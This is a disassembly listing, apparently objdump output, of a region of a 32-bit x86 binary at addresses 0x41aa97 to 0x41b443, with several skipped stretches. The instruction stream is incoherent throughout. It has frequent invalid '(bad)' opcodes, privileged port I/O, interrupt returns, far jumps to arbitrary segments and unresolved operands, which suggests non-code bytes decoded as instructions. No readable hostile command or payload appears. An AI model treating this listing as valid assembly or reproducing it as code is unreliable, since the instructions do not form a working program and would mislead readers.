  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x3530e277,al
  41aaa4:	push   eax
  41aaa5:	(bad)  
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    bl,bh
  41aaaf:	fidivr DWORD PTR [eax+0x17]
  41aab2:	mov    WORD PTR [ebp-0x65],ds
  41aab5:	mov    ds:0x3f8898c,eax
  41aaba:	ficomp WORD PTR ds:0x1641abc5
  41aac0:	sub    esi,DWORD PTR ds:[esp+ebp*8]
  41aac4:	or     BYTE PTR [edi-0x2a],dl
  41aac7:	xchg   esp,eax
  41aac8:	mov    cl,0xb0
  41aaca:	xchg   BYTE PTR [ebx+0x6b],cl
  41aacd:	or     edi,ebx
  41aacf:	add    eax,esp
  41aad1:	not    DWORD PTR [esi-0x380efd70]
  41aad7:	sub    ah,BYTE PTR [ebp+0x16]
  41aada:	sahf   
  41aadb:	in     eax,0x5f
  41aadd:	iret   
  41aade:	mov    cl,BYTE PTR [eax+0x52f7c3e0]
  41aae4:	xor    al,0x34
  41aae6:	(bad)  
  41aae7:	sbb    al,0xcf
  41aae9:	shl    edx,0x93
  41aaec:	cmp    BYTE PTR ds:0xa281a1b2,al
  41aaf2:	adc    bh,BYTE PTR [ebp+eax*8-0x4a]
  41aaf6:	ret    0x344c
  41aaf9:	test   eax,0x404033ba
  41aafe:	aam    0x76
  41ab00:	arpl   WORD PTR [edi+0x3cc00148],cx
  41ab06:	adc    al,0xd6
  41ab08:	push   ebx
  41ab09:	cmp    DWORD PTR [eax],edx
  41ab0b:	mov    esp,0xacb95710
  41ab10:	mov    ds,WORD PTR [esi-0x77]
  41ab13:	mov    ah,0xa7
  41ab15:	aam    0x47
  41ab17:	cmp    dl,cl
  41ab19:	cmp    dh,cl
  41ab1b:	push   ds
  41ab1c:	xlat   BYTE PTR ds:[ebx]
  41ab1d:	jl     0x41ab1f
  41ab1f:	popf   
  41ab20:	dec    ebx
  41ab21:	pop    es
  41ab22:	dec    ebp
  41ab23:	push   ecx
  41ab24:	sub    DWORD PTR [esi+0x3a31fa46],eax
  41ab2a:	iret   
  41ab2b:	call   0x459d807c
  41ab30:	pop    ebx
  41ab31:	cli    
  41ab32:	or     esi,DWORD PTR [ebx+0x35755735]
  41ab38:	adc    ah,BYTE PTR [ebx*1-0x7e0e0da1]
  41ab3f:	mov    ebx,0x724aeae0
  41ab44:	imul   esi,DWORD PTR [esi+ebp*8+0x62],0x58
  41ab49:	test   BYTE PTR [ecx+0x43026557],0x86
  41ab50:	xchg   ebx,eax
  41ab51:	mov    edi,fs
  41ab53:	(bad)  
  41ab54:	dec    edx
  41ab55:	push   ds
  41ab56:	int    0x6a
  41ab58:	dec    edx
  41ab59:	(bad)  
  41ab5a:	imul   esp,DWORD PTR ss:[edi+eiz*4+0x6b],0x481cc03b
  41ab63:	fnstenv [ebp-0x51]
  41ab66:	fist   DWORD PTR [edx+0x4eb8bede]
  41ab6c:	pop    es
  41ab6d:	or     al,0x94
  41ab6f:	inc    edx
  41ab70:	jno    0x41abcf
  41ab72:	cmp    DWORD PTR [ecx+0x66acdc84],0x19f15c7f
  41ab7c:	loope  0x41abcd
  41ab7e:	push   0xffffffb8
  41ab80:	mov    eax,0x244f954a
  41ab85:	mov    ecx,ebx
  41ab87:	add    DWORD PTR [esi],esp
  41ab89:	xchg   ebp,eax
  41ab8a:	jmp    0x6280:0x53814a87
  41ab91:	xchg   ebx,eax
  41ab92:	push   edi
  41ab93:	and    BYTE PTR [esi],dl
  41ab95:	test   al,0x41
  41ab97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab98:	cmp    BYTE PTR [ebx+eax*4-0x4e],bh
  41ab9c:	add    dh,bh
  41ab9e:	inc    ecx
  41ab9f:	mov    edx,0x64528945
  41aba4:	and    cl,bl
  41aba6:	mov    eax,ds:0x9c99436b
  41abab:	lds    edx,FWORD PTR [eax*1-0x114df711]
  41abb2:	dec    edx
  41abb3:	cmp    al,0xb5
	...
  41ac15:	add    BYTE PTR [edx+0x49],ch
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0x7379cc53
  41ac24:	pop    eax
  41ac25:	sub    ebp,esp
  41ac27:	sbb    DWORD PTR [ecx],eax
  41ac29:	add    BYTE PTR [edi],al
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [edi],dh
  41ac2f:	sub    bl,dl
  41ac31:	stos   BYTE PTR es:[edi],al
  41ac32:	dec    ch
  41ac34:	int3   
  41ac35:	xlat   BYTE PTR ds:[ebx]
  41ac36:	cmp    eax,0x91750e8d
  41ac3b:	cmp    al,0xfe
  41ac3d:	jbe    0x41ac53
  41ac3f:	jp     0x41ac30
  41ac41:	ja     0x41abfe
  41ac43:	cs mov eax,0x8ef86581
  41ac49:	xchg   esi,eax
  41ac4a:	mov    ecx,0xb0682c64
  41ac4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac50:	xor    edx,DWORD PTR [eax-0x207aa95c]
  41ac56:	shr    DWORD PTR [ebx],0x55
  41ac59:	sub    al,0x6b
  41ac5b:	pop    esp
  41ac5c:	xadd   bh,al
  41ac5f:	sbb    eax,0x8662ca4b
  41ac64:	icebp  
  41ac65:	enter  0xe28b,0x34
  41ac69:	icebp  
  41ac6a:	jne    0x41ac06
  41ac6c:	cmp    bh,BYTE PTR [ebx+0x26]
  41ac6f:	adc    ah,al
  41ac71:	dec    edi
  41ac72:	inc    esp
  41ac73:	lock pop ds
  41ac75:	and    ebx,ebp
  41ac77:	and    eax,0xacee70d1
  41ac7c:	mov    edi,0x45188ef8
  41ac81:	int    0x97
  41ac83:	sub    ecx,DWORD PTR [ebx+0x33]
  41ac86:	pop    eax
  41ac87:	(bad)  
  41ac88:	and    eax,0x86570181
  41ac8d:	pop    ecx
  41ac8e:	je     0x41aca2
  41ac90:	sbb    al,0x10
  41ac92:	sbb    DWORD PTR [ebp-0x53],0xd4e97475
  41ac99:	in     al,0x90
  41ac9b:	call   DWORD PTR [esp+ebx*4]
  41ac9e:	add    edx,DWORD PTR [eax]
  41aca0:	test   edx,esi
  41aca2:	test   eax,0x2f380467
  41aca7:	mov    ebx,0x7502ee7f
  41acac:	jnp    0x41accc
  41acae:	dec    edx
  41acaf:	lahf   
  41acb0:	jmp    0x6d54bfb2
  41acb5:	punpckldq mm1,DWORD PTR [eax+0x68]
  41acb9:	imul   esi,DWORD PTR [esi-0xde136e3],0xb28a2b59
  41acc3:	bnd jge 0x41ad01
  41acc6:	ss in  al,dx
  41acc8:	sbb    eax,0x66cfbc22
  41accd:	mov    edx,0xcffc505a
  41acd2:	pusha  
  41acd3:	xlat   BYTE PTR ds:[ebx]
  41acd4:	iret   
  41acd5:	pop    edx
  41acd6:	adc    al,0x50
  41acd8:	and    DWORD PTR [edx-0x79b9e2fb],ebx
  41acde:	cmp    al,0x15
  41ace0:	rcr    DWORD PTR [edi-0x5b0c51be],cl
  41ace6:	outs   dx,BYTE PTR ds:[esi]
  41ace7:	push   ecx
  41ace8:	dec    esi
  41ace9:	push   DWORD PTR [esi]
  41aceb:	or     edx,edx
  41aced:	(bad)  
  41acee:	xchg   edx,eax
  41acef:	js     0x41ad1f
  41acf1:	std    
  41acf2:	(bad)  
  41acf3:	xlat   BYTE PTR ds:[ebx]
  41acf4:	sar    BYTE PTR [ecx],1
  41acf6:	mov    DWORD PTR [edi-0x7806a72f],esp
  41acfc:	out    0x40,eax
  41acfe:	fdivrp st(5),st
  41ad00:	or     al,0x55
  41ad02:	les    ebp,FWORD PTR [edx]
  41ad04:	mov    esp,0x9747922e
  41ad09:	mov    bl,0x98
  41ad0b:	in     eax,dx
  41ad0c:	push   0xa2d20296
  41ad11:	add    al,0xa4
  41ad14:	push   0x6669032b
  41ad19:	sahf   
  41ad1a:	mov    ebp,DWORD PTR [eax+0x46]
  41ad1d:	bound  edx,QWORD PTR [ebx]
  41ad1f:	push   0x3ea81408
  41ad24:	sti    
  41ad25:	or     al,0xf0
  41ad27:	cwde   
  41ad28:	jge    0x41ad07
  41ad2a:	out    dx,al
  41ad2b:	inc    esi
  41ad2c:	xor    al,0xe8
  41ad2e:	test   eax,0xe6d8ac7a
  41ad33:	inc    ebp
  41ad34:	or     al,0x0
	...
  41ad96:	push   ebp
  41ad97:	clc    
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    esi,DWORD PTR [ecx-0xb]
  41ada4:	sbb    eax,0x11af303
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR ds:0x680c6b17,ch
  41adb3:	cmp    BYTE PTR [ebx],dl
  41adb5:	jno    0x41ae14
  41adb7:	scas   eax,DWORD PTR es:[edi]
  41adb8:	out    0x2a,al
  41adba:	lea    ecx,[esi+0x67c51c63]
  41adc0:	cmp    esp,DWORD PTR [ebp-0x3]
  41adc3:	lods   al,BYTE PTR ds:[esi]
  41adc4:	aad    0xf7
  41adc6:	bound  edi,QWORD PTR [esi]
  41adc8:	cs jbe 0x41ae40
  41adcb:	adc    dl,ah
  41adcd:	and    edx,DWORD PTR [edx+0x1f]
  41add0:	aas    
  41add1:	rol    DWORD PTR [eax-0x430f3883],cl
  41add7:	inc    ebx
  41add8:	jo     0x41ad82
  41adda:	in     eax,0xb6
  41addc:	sub    dl,dl
  41adde:	sar    BYTE PTR [edx+0x7d],cl
  41ade1:	or     eax,0xd7456616
  41ade6:	test   BYTE PTR [ecx-0x24],ah
  41ade9:	imul   ecx,DWORD PTR [ecx+0x6e],0x96624626
  41adf0:	jnp    0x41ae32
  41adf2:	int3   
  41adf3:	inc    edi
  41adf4:	dec    ebx
  41adf5:	xchg   cl,cl
  41adf7:	xor    DWORD PTR [edx+0x21],ebx
  41adfa:	scas   eax,DWORD PTR es:[edi]
  41adfb:	hlt    
  41adfc:	xor    eax,0xb7c88b41
  41ae01:	mov    ecx,0xac14d5a9
  41ae06:	aad    0xb7
  41ae08:	mov    dl,0x2f
  41ae0a:	push   ds
  41ae0b:	and    eax,0x618b7961
  41ae10:	xor    al,0x7f
  41ae12:	pop    ecx
  41ae13:	lahf   
  41ae14:	in     al,dx
  41ae15:	ret    
  41ae16:	jmp    0xb35ba839
  41ae1b:	pusha  
  41ae1c:	push   edx
  41ae1d:	outs   dx,DWORD PTR ds:[esi]
  41ae1e:	jmp    0x41ae62
  41ae20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae21:	dec    DWORD PTR [eax+0x5081dd7e]
  41ae27:	xor    al,0x2e
  41ae29:	in     al,0xd8
  41ae2b:	pop    ds
  41ae2c:	loop   0x41ae8c
  41ae2e:	push   DWORD PTR [edi-0x68b1f767]
  41ae34:	cmp    eax,0x870ade3a
  41ae39:	cmp    DWORD PTR [edi+ebp*8],ebp
  41ae3c:	cmp    dh,BYTE PTR [eax+edx*8]
  41ae3f:	dec    eax
  41ae40:	sahf   
  41ae41:	xor    bl,BYTE PTR [ebx-0x528bd196]
  41ae47:	dec    DWORD PTR [edx+0x768cf56c]
  41ae4d:	out    0xa8,eax
  41ae4f:	inc    edi
  41ae50:	mov    ebp,0x859b8b03
  41ae55:	repnz cmp eax,DWORD PTR [ecx]
  41ae58:	push   es
  41ae59:	xor    al,0x18
  41ae5b:	retf   0x6e50
  41ae5e:	pusha  
  41ae5f:	adc    BYTE PTR [ebx],dl
  41ae61:	xchg   esi,eax
  41ae62:	lock mov al,BYTE PTR [ecx+0x66]
  41ae66:	(bad)  
  41ae67:	ficomp WORD PTR [ecx+0x450fc3fe]
  41ae6d:	pop    esp
  41ae6e:	sub    eax,0x11781c2e
  41ae73:	xchg   DWORD PTR [ebp-0x2017d77c],eax
  41ae79:	or     dl,dl
  41ae7b:	aas    
  41ae7c:	mov    ebp,0xdfce3478
  41ae81:	inc    ebp
  41ae82:	adc    bl,0xb1
  41ae85:	in     al,0xbc
  41ae87:	inc    esi
  41ae88:	(bad)  
  41ae89:	mov    ebp,0x8b63f8a1
  41ae8e:	sbb    ebx,eax
  41ae90:	arpl   WORD PTR [ebx+0x13d962da],ax
  41ae96:	add    ebp,DWORD PTR [eax+0x603d4054]
  41ae9c:	push   esp
  41ae9d:	xlat   BYTE PTR ds:[ebx]
  41ae9e:	not    BYTE PTR [edi+0x408d59df]
  41aea4:	jecxz  0x41af1a
  41aea6:	test   BYTE PTR [edx+0x7cd86feb],bh
  41aeac:	loopne 0x41af05
  41aeae:	or     edi,DWORD PTR [eax-0x75]
  41aeb1:	push   esi
  41aeb2:	inc    ebp
  41aeb3:	adc    ah,BYTE PTR [eax+eax*1]
	...
  41af16:	(bad)  
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af64
  41af23:	mov    ecx,0x1bfa2b06
  41af28:	add    DWORD PTR [eax],eax
  41af2a:	pop    es
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [eax],cl
  41af2f:	test   ch,ah
  41af31:	mov    edi,0xba66228c
  41af36:	push   esi
  41af37:	xchg   BYTE PTR [eax+0x37],dh
  41af3a:	js     0x41af08
  41af3c:	adc    eax,0xe9a2ecd0
  41af41:	aaa    
  41af42:	sbb    bh,BYTE PTR [edx-0x4e]
  41af45:	or     al,0xf9
  41af47:	clc    
  41af48:	fcomi  st,st(7)
  41af4a:	push   edx
  41af4b:	invd   
  41af4d:	and    eax,0x6441a4b3
  41af52:	jmp    0x77e4:0xf80974ee
  41af59:	push   ss
  41af5a:	out    dx,eax
  41af5b:	fcomi  st,st(1)
  41af5d:	or     eax,0x5164195e
  41af62:	jge    0x41af18
  41af64:	int    0x77
  41af66:	and    dh,dh
  41af68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af69:	pop    ecx
  41af6a:	jo     0x41aefa
  41af6c:	sbb    BYTE PTR [edx-0x64a59b37],bh
  41af72:	push   0xffffffb6
  41af74:	mov    eax,ds:0x500d6ccf
  41af79:	icebp  
  41af7a:	jmp    0x41afbe
  41af7c:	jmp    0x15ce:0x93618546
  41af83:	pop    ss
  41af84:	adc    dh,BYTE PTR [ebx]
  41af86:	(bad)  
  41af87:	invd   
  41af89:	ficomp DWORD PTR [edi-0x30c79afd]
  41af8f:	or     ebx,ecx
  41af91:	push   edi
  41af92:	(bad)  
  41af93:	mov    ss,WORD PTR [ecx-0x3c7e541d]
  41af99:	inc    edx
  41af9a:	sbb    al,0x6
  41af9c:	mul    BYTE PTR [ecx]
  41af9e:	fst    QWORD PTR [eax]
  41afa0:	dec    edi
  41afa1:	mov    dh,0x5b
  41afa3:	jb     0x41b01d
  41afa5:	xlat   BYTE PTR ds:[ebx]
  41afa6:	sahf   
  41afa7:	sar    BYTE PTR [ecx],0xba
  41afaa:	push   cs
  41afab:	mov    cl,0x17
  41afad:	adc    DWORD PTR [edx+0x1b],esi
  41afb0:	imul   esi,DWORD PTR [edx+0x78],0x1de4a176
  41afb7:	mov    cl,0xb0
  41afb9:	jl     0x41afbc
  41afbb:	xor    BYTE PTR [edi+ebx*1-0x44],dh
  41afbf:	inc    ebx
  41afc0:	pop    ebp
  41afc1:	(bad)  
  41afc2:	sub    al,0xa
  41afc4:	cmp    DWORD PTR [edi],0xcd162ce4
  41afca:	(bad)  
  41afcb:	fisttp DWORD PTR [ebx-0x27a73489]
  41afd1:	paddsw mm6,QWORD PTR [edi]
  41afd4:	loope  0x41afd4
  41afd6:	push   edi
  41afd7:	inc    ecx
  41afd8:	adc    DWORD PTR [ecx+0x37],ebp
  41afdb:	push   esi
  41afdc:	dec    eax
  41afdd:	mov    esi,0x6d3d8c01
  41afe2:	aaa    
  41afe3:	and    DWORD PTR [eax+ecx*1],edx
  41afe6:	out    dx,eax
  41afe7:	(bad)  
  41afe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afe9:	std    
  41afea:	xchg   edx,eax
  41afeb:	imul   BYTE PTR [esi]
  41afed:	mov    dl,0xa2
  41afef:	inc    esp
  41aff0:	push   edi
  41aff1:	mov    bl,0x4d
  41aff3:	(bad)  
  41aff4:	bound  edi,QWORD PTR ds:0x322486b
  41affa:	cli    
  41affb:	mov    ebp,0x6ed6cc3
  41b000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b001:	int3   
  41b002:	ret    0x4612
  41b005:	call   0x74e3:0xcf673a5e
  41b00c:	push   edx
  41b00d:	add    al,0x7c
  41b00f:	mov    edi,0xd35d7538
  41b014:	lods   eax,DWORD PTR ds:[esi]
  41b015:	mov    dh,0x69
  41b017:	ret    0x37c5
  41b01a:	mov    eax,ds:0xc33a8a60
  41b01f:	pop    esp
  41b020:	add    DWORD PTR [edi+0x69],edi
  41b023:	(bad)
  41b026:	inc    ebx
  41b027:	push   0xffffffd4
  41b029:	pushf  
  41b02a:	mov    esi,es
  41b02c:	rol    DWORD PTR [ebx+eiz*1+0x58],0x6e
  41b031:	xchg   ebx,eax
  41b032:	test   eax,0x44df
	...
  41b093:	add    BYTE PTR [eax],al
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi-0x5a8d5acf]
  41b0a5:	jo     0x41b0a8
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	mov    esi,DWORD PTR [eax-0xb82ba4d]
  41b0b4:	cdq    
  41b0b5:	(bad)  
  41b0b6:	adc    DWORD PTR [ebx-0x66],ecx
  41b0b9:	or     eax,eax
  41b0bb:	das    
  41b0bc:	sbb    al,0x2e
  41b0be:	out    0xca,eax
  41b0c0:	gs jg  0x41b076
  41b0c3:	out    0x75,al
  41b0c5:	or     DWORD PTR [edx-0x5d423693],ebp
  41b0cb:	sahf   
  41b0cc:	shl    BYTE PTR [ecx],0xd1
  41b0cf:	dec    esi
  41b0d0:	jbe    0x41b110
  41b0d2:	std    
  41b0d3:	and    al,0xbe
  41b0d5:	jmp    0x71fa:0x78e07418
  41b0dc:	adc    eax,DWORD PTR [ebx-0x5795bff9]
  41b0e2:	inc    esp
  41b0e3:	inc    esi
  41b0e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0e5:	mov    WORD PTR [edi],?
  41b0e7:	cmc    
  41b0e8:	push   ss
  41b0e9:	rcl    al,0xfc
  41b0ec:	adc    eax,0xa1058230
  41b0f1:	xchg   DWORD PTR [ebx],esp
  41b0f3:	inc    ecx
  41b0f4:	inc    esp
  41b0f5:	add    al,0x13
  41b0f7:	pop    esi
  41b0f8:	mov    ds:0x88874247,al
  41b0fd:	or     eax,0x35b27b40
  41b102:	push   esp
  41b103:	fiadd  WORD PTR [esi]
  41b105:	jne    0x41b0e6
  41b107:	mov    dh,0x3a
  41b109:	shl    esi,cl
  41b10b:	jp     0x41b133
  41b10d:	stos   DWORD PTR es:[edi],eax
  41b10e:	xchg   esi,eax
  41b10f:	pop    ds
  41b110:	mov    ebp,0xe22acc28
  41b115:	out    dx,eax
  41b116:	pop    edi
  41b117:	or     BYTE PTR [ebx+0x7d],0xad
  41b11b:	push   ds
  41b11c:	sub    ch,BYTE PTR [edx]
  41b11e:	dec    eax
  41b11f:	and    DWORD PTR [esi],ebx
  41b121:	mov    bl,0x61
  41b123:	jae    0x41b124
  41b125:	xchg   edi,eax
  41b126:	mov    ebx,0x122b3565
  41b12b:	add    al,0xf1
  41b12d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41b12f:	pop    edx
  41b130:	and    bl,bh
  41b132:	rcr    bl,cl
  41b134:	or     edx,DWORD PTR [ecx]
  41b136:	retf   0x8bd2
  41b139:	or     BYTE PTR [ecx-0x66380265],bl
  41b13f:	out    dx,eax
  41b140:	scas   al,BYTE PTR es:[edi]
  41b141:	sub    al,0x2c
  41b143:	push   esi
  41b144:	leave  
  41b145:	xchg   edx,eax
  41b146:	fist   DWORD PTR [ecx-0x2a5259a2]
  41b14c:	test   eax,0x9d796db8
  41b151:	mov    bl,BYTE PTR [edi]
  41b153:	push   0x1d
  41b155:	repnz add BYTE PTR [ebx+edi*1-0x7999622d],dh
  41b15d:	add    cl,BYTE PTR [edi+edx*2]
  41b160:	jo     0x41b104
  41b162:	mov    al,0xcf
  41b164:	xchg   ecx,eax
  41b165:	into   
  41b166:	lahf   
  41b167:	(bad)  
  41b168:	loop   0x41b1bc
  41b16a:	rol    eax,0xaf
  41b16d:	cmp    eax,DWORD PTR [esp-0x7e55bb60]
  41b174:	sub    BYTE PTR [ebp-0x2da781d3],ah
  41b17a:	push   cs
  41b17b:	push   ecx
  41b17c:	dec    ecx
  41b17d:	adc    al,0xf1
  41b17f:	popf   
  41b180:	xchg   DWORD PTR [edi+0x13],ecx
  41b183:	jl     0x41b174
  41b185:	cmc    
  41b186:	mov    ebx,0x607f0829
  41b18b:	ret    
  41b18c:	retf   0xdf10
  41b18f:	fstp   TBYTE PTR [edx+0x22d75c0a]
  41b195:	push   esp
  41b196:	and    al,0xab
  41b198:	adc    ah,ah
  41b19a:	inc    ebx
  41b19b:	cmp    bh,dh
  41b19d:	outs   dx,BYTE PTR ds:[esi]
  41b19e:	jl     0x41b1f5
  41b1a0:	neg    BYTE PTR [eax+0x2]
  41b1a3:	dec    edi
  41b1a4:	lock imul ebx,DWORD PTR [eax-0x6a],0x2f3a8d68
  41b1ac:	fs sbb eax,0xeed2ba47
  41b1b2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1b4:	push   ecx
	...
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	dec    ebp
  41b223:	retf   0x15bf
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [eax+0x42230af7],dl
  41b233:	mov    ecx,0x1516e4ed
  41b238:	ja     0x41b216
  41b23a:	cmp    DWORD PTR [edx+ebx*2+0xddc17a0],esi
  41b241:	cwde   
  41b242:	sub    DWORD PTR [esi],edi
  41b244:	mov    esi,DWORD PTR es:[ecx]
  41b247:	inc    esp
  41b248:	stos   BYTE PTR es:[edi],al
  41b249:	push   edx
  41b24a:	push   esp
  41b24b:	mov    al,ds:0x3c182a18
  41b250:	push   cs
  41b251:	ins    DWORD PTR es:[edi],dx
  41b252:	add    DWORD PTR [ebp+0x1b],ebp
  41b255:	cmp    al,0x86
  41b257:	jle    0x41b24f
  41b259:	sbb    BYTE PTR [esi-0x4e],bl
  41b25c:	aad    0x27
  41b25e:	cmp    ebx,edi
  41b260:	push   ebx
  41b261:	mov    al,ds:0x3ff7159a
  41b266:	mov    ds:0xc2797926,eax
  41b26b:	enter  0x97f4,0xe7
  41b26f:	cmp    BYTE PTR [eax-0xe60d997],bh
  41b275:	dec    esp
  41b276:	or     ebp,DWORD PTR [esi+0x837ae82]
  41b27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27d:	inc    ebx
  41b27e:	cmp    DWORD PTR [eax+0x38],ebx
  41b281:	inc    ebx
  41b282:	shr    DWORD PTR [edx+0x3633aaa4],1
  41b288:	int3   
  41b289:	jb     0x41b2c9
  41b28b:	push   esi
  41b28c:	mov    al,ds:0x9bfe5f5
  41b291:	(bad)  
  41b293:	test   DWORD PTR [ecx-0x56],esi
  41b296:	scas   al,BYTE PTR es:[edi]
  41b297:	jb     0x41b291
  41b299:	js     0x41b2f7
  41b29b:	jnp    0x41b2f6
  41b29d:	ret    
  41b29e:	loope  0x41b240
  41b2a0:	xlat   BYTE PTR ds:[ebx]
  41b2a1:	or     DWORD PTR [eax-0x7ec8db72],0xd7eeef9f
  41b2ab:	jno    0x41b2e2
  41b2ad:	loope  0x41b2b0
  41b2af:	popa   
  41b2b0:	pop    esp
  41b2b1:	push   esi
  41b2b2:	(bad)  
  41b2b3:	hlt    
  41b2b4:	fwait
  41b2b5:	ret    0x14e3
  41b2b8:	inc    ecx
  41b2b9:	pop    ebx
  41b2ba:	adc    al,0xd
  41b2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2bd:	pop    edx
  41b2be:	mov    ah,0xfa
  41b2c0:	jbe    0x41b2d4
  41b2c2:	cmp    DWORD PTR [ebp-0x59d0ac01],0xffffffbe
  41b2c9:	pop    ebp
  41b2ca:	out    0xf5,al
  41b2cc:	mov    cl,0xbf
  41b2ce:	or     al,cl
  41b2d0:	jmp    0xbcc2:0x1c7fc2f
  41b2d7:	cmp    dl,BYTE PTR [esi]
  41b2d9:	clc    
  41b2da:	scas   eax,DWORD PTR es:[edi]
  41b2db:	mov    ecx,DWORD PTR [eax]
  41b2dd:	mov    bh,BYTE PTR [esi-0x2]
  41b2e0:	cmc    
  41b2e1:	dec    eax
  41b2e2:	shl    BYTE PTR [edx-0x70b5617],cl
  41b2e8:	shr    ecx,cl
  41b2ea:	cmp    dl,BYTE PTR [eax+0x6b]
  41b2ed:	add    BYTE PTR [edi-0x6f],ch
  41b2f0:	addr16 add eax,0xb08630ea
  41b2f6:	mov    esi,0x4460cd18
  41b2fb:	lods   al,BYTE PTR ds:[esi]
  41b2fc:	pushf  
  41b2fd:	add    ecx,edi
  41b2ff:	popf   
  41b300:	lods   eax,DWORD PTR ds:[esi]
  41b301:	pop    eax
  41b302:	dec    ecx
  41b303:	cld    
  41b304:	fwait
  41b305:	mov    DWORD PTR [esp+ebp*4+0x55],ebp
  41b309:	inc    ecx
  41b30a:	sbb    ebp,ebp
  41b30c:	rol    BYTE PTR [esi-0x6988c5b1],cl
  41b312:	call   0x3b38:0x5743077e
  41b319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b31a:	fld    QWORD PTR [eax]
  41b31c:	dec    eax
  41b31d:	inc    edi
  41b31e:	popa   
  41b31f:	(bad)  
  41b320:	cli    
  41b321:	mov    ds:0x9f22a5e6,al
  41b326:	out    dx,al
  41b327:	sub    bh,al
  41b329:	dec    ebx
  41b32a:	nop
  41b32b:	dec    edx
  41b32c:	cmp    BYTE PTR [ebp-0x491faf2f],0xa4
  41b333:	push   ebp
  41b334:	jne    0x41b336
	...
  41b396:	dec    eax
  41b397:	or     eax,0xbb5dab1d
  41b39c:	(bad)  
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	pop    ecx
  41b3a3:	jnp    0x41b363
  41b3a5:	lods   al,BYTE PTR ds:[esi]
  41b3a6:	nop    DWORD PTR [ecx]
  41b3a9:	add    BYTE PTR [edi],al
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [esi],ch
  41b3af:	lahf   
  41b3b0:	lods   al,BYTE PTR ds:[esi]
  41b3b1:	xor    esp,eax
  41b3b3:	fist   DWORD PTR [esi]
  41b3b5:	dec    ebp
  41b3b6:	ds test cl,0x7e
  41b3ba:	sbb    bl,BYTE PTR [ebx+0x74]
  41b3bd:	outs   dx,BYTE PTR ds:[esi]
  41b3be:	pop    edi
  41b3bf:	ficom  DWORD PTR [esp+esi*8]
  41b3c2:	cmp    dh,BYTE PTR [ebp-0x5d]
  41b3c5:	neg    dh
  41b3c7:	push   ebp
  41b3c8:	xor    eax,0x3df6e8d5
  41b3cd:	stos   BYTE PTR es:[edi],al
  41b3ce:	fs pop ecx
  41b3d0:	pop    eax
  41b3d1:	fiadd  WORD PTR [edx-0x75]
  41b3d4:	aam    0x34
  41b3d6:	in     eax,0x31
  41b3d8:	mov    ebp,0xda2fe8d6
  41b3dd:	shl    DWORD PTR [eax],0x13
  41b3e0:	lds    edx,FWORD PTR [esi+0x3b3da999]
  41b3e6:	inc    ebx
  41b3e7:	add    ecx,DWORD PTR [edi+0x74]
  41b3ea:	in     eax,0xfe
  41b3ec:	jmp    FWORD PTR [edi+0x46f12da0]
  41b3f2:	int3   
  41b3f3:	and    BYTE PTR [ecx-0x253d13ba],0x93
  41b3fa:	lods   al,BYTE PTR ds:[esi]
  41b3fc:	ds add cl,bl
  41b3ff:	neg    BYTE PTR [edi]
  41b401:	push   cs
  41b402:	iret   
  41b403:	and    ch,BYTE PTR ds:[edi-0x3e13814a]
  41b40a:	inc    edx
  41b40b:	es stos DWORD PTR es:[edi],eax
  41b40d:	adc    al,0x21
  41b40f:	js     0x41b479
  41b411:	adc    edx,DWORD PTR [ecx-0x77cb7d49]
  41b417:	sbb    al,0x55
  41b419:	dec    ebp
  41b41a:	mov    ds:0x54a73a1,eax
  41b41f:	retf   0x66e8
  41b422:	addr16 repz fwait
  41b425:	push   esp
  41b426:	fadd   QWORD PTR [ecx]
  41b428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b429:	jle    0x41b421
  41b42b:	mov    ds:0xcb281453,al
  41b430:	popa   
  41b431:	call   0x52b3:0x2d838de4
  41b438:	fild   QWORD PTR [ebx+edi*8]
  41b43b:	and    edx,edi
  41b43d:	mov    ds:0xd0e66713,eax
  41b442:	inc    ebp
  41b443:	jb     0x41b4c4
